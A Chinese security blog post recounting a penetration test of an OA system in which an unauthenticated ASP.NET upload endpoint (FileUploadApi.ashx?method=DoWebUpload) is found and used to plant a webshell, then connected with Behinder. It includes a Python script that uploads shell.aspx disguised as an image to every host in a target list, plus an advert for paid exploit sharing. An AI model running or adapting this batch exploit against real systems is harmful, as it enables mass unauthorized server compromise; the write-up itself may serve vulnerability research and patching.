#  记一次某OA渗透测试有意思的文件上传漏洞挖掘经历以及分析   
1674701160110592  神农Sec   2025-01-03 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
原文链接：https://xz.aliyun.com/t/16959  
  
作者：1674701160110592  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 登录**  
  
  
我这边首先找到的是一个文件上传的登陆框  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgOQniciaYrurPQ5icibJNFibzlvZnCaiasaqfalQ9HqOQo9O4dPncWZbmdicrQ/640?wx_fmt=png&from=appmsg "")  
  
测试了一下sql注入之类的，发现没有  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 目录扫描**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgvn4GwVzWk9S0BohEgXpsSpkLYFgggMS9Rnhj3ABnX7TicMlicJUxVtCA/640?wx_fmt=png&from=appmsg "")  
  
  
看到api爆出200 ok的那一刻我的心情是激动的，感觉要有很多接口泄露了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgcIT1IcoAcl4v0vJHeZGVy38f29mFaJN6vCKLjNQmPVKTEJQianKjKGA/640?wx_fmt=png&from=appmsg "")  
  
  
一堆ashx文件加上一个UEditor的组件，ashx  
  
.ashx  
   
文件扩展名  
通常用于表示 ASP.NET 处理程序（ASP.NET Handler）。ASP.NET 处理程序是一种在服务器端处理特定类型请求的代码文件。这些文件通常用于执行一些特殊的服务器任务，如图像生成、文件下载或其他动态内容的处理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFg28tLAbK0pylWh6ibVv3LSbYDQ5guDN4ZQSsV2BEYX4m2jDzU1Baib0rA/640?wx_fmt=png&from=appmsg "")  
  
  
ueditor组件也有一个ashx文件，看着文件名字应该就是用来处理文件上传功能的  
  
我们访问一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgGYKicqddtvW0VhoKcw06ohcX6DNNxz6H54qJO2mZ3rjQdA60IP9h05g/640?wx_fmt=png&from=appmsg "")  
  
给我返回了这个消息，那么我们可以理解为这个文件应该是要传递一个参数的，但是参数是什么，我们目前还不知道  
  
我爆破了一下参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgf6LrhIuRE1D0KFTDwycGHqJb8YqZf8av6t2Xe5hh4uP8dpHFXO4ZgQ/640?wx_fmt=png&from=appmsg "")  
  
依旧是接口错误  
  
难道到手的文件上传getshell（bushi就要没了吗？  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 查看前段源代码**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgM1Xfniaz73T6cxtbQYgxjAa5YdbImyEicziaE86JQpmzgCv2Ufmo7YUyw/640?wx_fmt=png&from=appmsg "")  
  
查看了一下这个js源码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgX0zFjwmbcnfc20ibg05s8mlmNbuOJxATMvx0jJQ4iaM0d3mIw3ymwyzg/640?wx_fmt=png&from=appmsg "")  
  
  
一搜索就搜到了我那个文件名  
  
那么就是说可以有文件删除和文件上传两个选择，传入DoWebUpload或者DoDelete参数即可  
  
那么我们选择上传一个木马文件试试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgsmIXeh3LA3Uaore1DqF7xAcsGrZlaKvYY5BfTp8yfib9hpiaxfAE5ZVg/640?wx_fmt=png&from=appmsg "")  
  
  
直接就上传成功了冰蝎连接试试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgHGRaX2eyGIuOnaMOxhFlgtXoDnTuQN00JygqxIIibbvoahJicl89jNug/640?wx_fmt=png&from=appmsg "")  
  
直接就是getshell成功了  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 批量脚本测试**  
  
```
import requests
import os
os.environ["http_proxy"] = "http://127.0.0.1:7890"
os.environ["https_proxy"] = "http://127.0.0.1:7890"
def poc(url=""):
# 目标URL
    url = url+'/api/FileUploadApi.ashx?method=DoWebUpload'
    files = {
        'file': ('shell.aspx', """
        """, 'image/png')
    }
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'null',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive'
    }
    try:
        # 发送POST请求
        response = requests.post(url, files=files, headers=headers,timeout=5)
        # 打印返回结果
        print('Response Code:', response.status_code)
        print('Response Text:', response.text)
    except Exception as e:
        print(e)
if __name__ == '__main__':
    file_path = 'url'
    with open(file_path, 'r', encoding='utf-8') as file:
        for line in file:
            print(line.strip())  # 使用 strip() 去掉行末的换行符
            poc("http://" + line.strip())
    # poc()
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWV4tY9cstmOLZbmOMFgQSFgicKzmWICeYG2vQNZGD3xTJ8J5uuvibtEFtnfa7Yp03LPA1ngsLqRgAKg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 总结**  
  
  
这次感觉这个文件上传藏得还是比较深的，也是告诉自己挖掘一些漏洞的时候，千万不能放过任何一处细节，往往细节决定成败。  
  
  
  
我们是神农安全，  
**点赞 + 在看**  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、微信小群一起挖洞
5、不定期有众测、渗透测试项目
6、需要职业技能大赛环境dd我
```  
  
  
  
  
  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWBeNFS2WNPd2FJ1SmqGkcf3s0DkMZicbriaUEuXagWt2eqxBWkUXRyQabIczmNAT5nTxc9tvaBzlww/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满200人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
****  
    
  
